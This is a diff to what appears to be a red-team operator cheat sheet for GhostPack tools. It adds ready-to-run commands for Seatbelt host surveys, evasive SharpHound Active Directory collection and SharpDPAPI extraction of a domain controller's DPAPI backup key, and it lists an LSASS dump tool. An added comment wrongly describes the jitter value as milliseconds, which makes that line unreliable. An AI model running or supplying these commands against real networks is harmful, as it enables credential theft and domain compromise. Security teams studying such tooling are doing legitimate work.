@@ -1,12 +1,13 @@
 GhostPack Tools
   SharpGPOAbuse.exe GPO modificatino tool
-  Seatbelt.exe system|user (Opsec Tool)
+  Seatbelt.exe -group=all -full -outputfile="c:\windows\temp\out.txt"
   SharpUp.exe (Privesc Tool)
   SharpDump.exe (LSASS MiniDump Tool)
   SharpView.exe (Network Enumeration) (Use module -Help to get syntax)
     - Exmaple: SharpView.exe Get-NetLoggedon localhost
     - PowerView Examples: https://powersploit.readthedocs.io/en/latest/Recon
-  SharpHound.exe execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpHound.exe -c All,GPOLocalGroup --windowsonly --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties  --throttle 120000 --jitter 7
+  SharpHound.exe -c All,GPOLocalGroup --windowsonly --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties  --throttle 10000 --jitter 23
+    - Jitter is in milliseconds; 10000 = 10 seconds
   Rubeus.exe (Kerberose Tool)
   SharpDPAPI.exe
     - DA: SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
